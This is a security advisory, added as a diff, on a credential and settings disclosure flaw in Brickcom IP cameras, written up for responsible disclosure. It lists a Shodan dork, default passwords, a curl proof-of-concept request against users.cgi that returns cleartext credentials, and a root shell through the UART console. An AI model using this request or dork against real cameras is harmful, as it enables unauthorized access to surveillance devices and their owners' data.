@@ -1,0 +1,117 @@
+1. Advisory Information
+========================================
+Title:
+
+Brickcom IP-Camera Remote Credentials and Settings Disclosure
+
+
+Vendor Homepage:
+
+http://www.brickcom.com
+
+Tested on Camera types:
+
+WCB-040Af, WCB-100A, WCB-100Ae, OB-302Np, OB-300Af, OB-500Af
+
+
+Remotely Exploitable:
+
+Yes
+
+Vulnerability:
+
+Username / Password / Settings Disclosure (Critical)
+
+Shodan Dork:
+
+title:"Brickcom"
+
+
+Date:
+
+14/12/2016
+
+Authors:
+
+Emiliano Ipar         (@maninoipar)      (linkedin.com/in/emilianoipar)
+
+Ignacio Agustín Lizaso         (@ignacio_lizaso) (linkedin.com/in/ignacio-
+lizaso-9ab73359)
+Gastón Emanuel Rivadero (@derlok_epsilon) (linkedin.com/in/gaston-
+emanuel-rivadero-858b9ba)
+
+
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test and Research by
+Emiliano Ipar, Ignacio Lizaso and Gastón Rivadero.
+
+
+3. Description
+========================================
+Brickom Cameras allow a low-privilege user to disclose every configuration
+in the NVRAM, including credentials in clear text, remotely by making a
+simple requests. This vulnerability, coupled with the fact that there are
+two default users with known passwords which are rarely modified, allows an
+attacker to disclose the admin password and latter every config.
+
+The most Critical API call is users.cgi?action=getUsers, which provides
+every user credential. Many other API calls to get information for the WIFI
+password or FTP credentials, even the whole configuration, are affected
+depending on the camera model.
+
+On the hardware side, the UART console of some models (example: WCB-040Af,
+with baudrate 38400) is exposed in the PCB and after soldering the
+corresponding pins and connecting, the resulting shell has root access. A
+simple NVSHOW command will list every config available in clear text,
+including credentials.
+
+
+4. Proof-of-Concept:
+========================================
+Using the following GET request:
+
+curl http://<IP>:<PORT>/cgi-bin/users.cgi?action=getUsers -u user:pass -v
+
+Request:
+----------
+> GET /cgi-bin/users.cgi?action=getUsers HTTP/1.1
+> Authorization: Basic <BASE64 user:pass>
+> User-Agent: curl/7.35.0
+> Host: <IP>:<PORT>
+> Accept: */*
+>
+
+
+Response:
+----------
+< HTTP/1.1 200 Ok
+< Server: mini_httpd
+< Cache-Control: no-cache
+< Pragma: no-cache
+< Expires: 0
+< Content-Type: text/html
+< Connection: close
+<
+size=3
+User1.index=0
+User1.username=admin
+User1.password=admin
+User1.privilege=1
+
+User2.index=1
+User2.username=viewer
+User2.password=viewer
+User2.privilege=0
+
+User3.index=3
+User3.username=rviewer
+User3.password=rviewer
+User3.privilege=2
+
+5. SOLUTION
+========================================
+The vendor has been contacted and the firmware was updated. See disclosure
+in:
+
+https://www.brickcom.com/news/productCERT_security_advisorie.php
